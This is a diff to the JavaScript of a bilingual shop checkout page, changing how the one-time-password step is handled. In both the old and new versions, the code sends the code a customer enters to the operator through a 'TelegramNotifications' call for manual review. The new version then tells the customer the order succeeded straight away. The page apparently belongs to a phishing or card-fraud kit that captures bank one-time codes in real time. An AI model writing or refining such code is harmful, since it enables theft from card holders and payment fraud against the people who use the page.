@@ -1311,92 +1311,43 @@ function startOTPCountdown() {
 
 function verifyOTP() {
     try {
-        const otpInput = document.getElementById('otp-single-input');
-        const otpContent = document.querySelector('.otp-content');
         const otpError = document.getElementById('otp-error');
+        const otpInput = document.getElementById('otp-single-input');
 
         // Critical check: if elements don't exist, we can't proceed.
-        if (!otpInput || !otpContent || !otpError) {
-            console.error('One or more critical OTP elements are missing from the DOM.', { otpInput, otpContent, otpError });
+        if (!otpInput || !otpError) {
+            console.error('OTP input or error element not found.');
             alert('A UI error occurred. Please close the checkout and try again.');
             return;
         }
 
         const enteredOTP = otpInput.value.trim();
-        console.log('Verify button clicked. OTP entered:', enteredOTP);
 
-        otpError.style.display = 'none';
-
-        if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
-            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
-        }
-
-        otpContent.innerHTML = `
-            <div class="success-icon" style="font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem;">
-                <i class="fas fa-hourglass-half"></i>
-            </div>
-            <h3>${(currentLanguage === 'es' ? 'Esperando Confirmación' : 'Awaiting Confirmation')}</h3>
-            <p>${(currentLanguage === 'es' ? 'Tu pedido está pendiente de aprobación manual. Recibirás una notificación pronto.' : 'Your order is pending manual approval. You will receive a notification shortly.')}</p>
-        `;
-
-        pollForConfirmation(checkoutData.orderNumber);
-    } catch (err) {
-        console.error("A critical error occurred in verifyOTP:", err);
-        alert("An unexpected error occurred. Please check the developer console for details.");
-    }
-}
-
-/**
- * Polls a backend endpoint to check for payment confirmation from Telegram.
- * @param {string} orderNumber - The order reference to check.
- */
-function pollForConfirmation(orderNumber) {
-    const pollInterval = 5000; // Check every 5 seconds
-    const maxPolls = 24; // Stop after 2 minutes (24 * 5s = 120s)
-    let pollCount = 0;
-
-    const pollId = setInterval(async () => {
-        pollCount++;
-
-        // Stop polling after timeout
-        if (pollCount > maxPolls) {
-            clearInterval(pollId);
-            const otpContent = document.querySelector('.otp-content');
-            if (otpContent) {
-                otpContent.innerHTML = `
-                    <h3>Confirmation Timeout</h3>
-                    <p>We did not receive confirmation in time. Please try again or contact support.</p>
-                `;
+        // Basic validation for 6 digits
+        if (enteredOTP.length !== 6 || !/^\d{6}$/.test(enteredOTP)) {
+            otpError.style.display = 'block';
+            const errorSpan = otpError.querySelector('span');
+            if (errorSpan) {
+                errorSpan.textContent = translations[currentLanguage].invalid_code || 'Invalid code. Please try again.';
             }
             return;
         }
 
-        try {
-            // IMPORTANT: Replace the URL below with the webhook from your *second* Make.com scenario
-            // (the one that checks the Data Store).
-            const checkStatusUrl = `https://hook.eu2.make.com/YOUR_NEW_STATUS_CHECK_WEBHOOK?orderRef=${orderNumber}`; // <-- PASTE YOUR NEW WEBHOOK URL HERE
-            
-            const response = await fetch(checkStatusUrl, {
-                method: 'GET',
-                cache: 'no-cache' // Important for polling to get fresh data
-            });
-            const data = await response.json();
+        // Hide error if it was previously shown
+        otpError.style.display = 'none';
 
-            if (data.status === 'confirmed') {
-                clearInterval(pollId);
-                processOrder(); // Payment confirmed, complete the order!
-            } else if (data.status === 'rejected') {
-                clearInterval(pollId);
-                const otpContent = document.querySelector('.otp-content');
-                if (otpContent) {
-                    otpContent.innerHTML = `<h3>Payment Rejected</h3><p>Your payment was not confirmed. Please try again.</p>`;
-                }
-            }
-            // If status is 'pending', the interval will simply run again.
-        } catch (error) {
-            console.error('Polling error:', error); // Log error but continue polling for a while
+        // Send the OTP to Telegram for you to review
+        if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
+            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
         }
-    }, pollInterval);
+
+        // Immediately proceed to the success screen for the user
+        processOrder();
+
+    } catch (err) {
+        console.error("A critical error occurred in verifyOTP:", err);
+        alert("An unexpected error occurred. Please check the developer console for details.");
+    }
 }
 
 function skipOTP() {
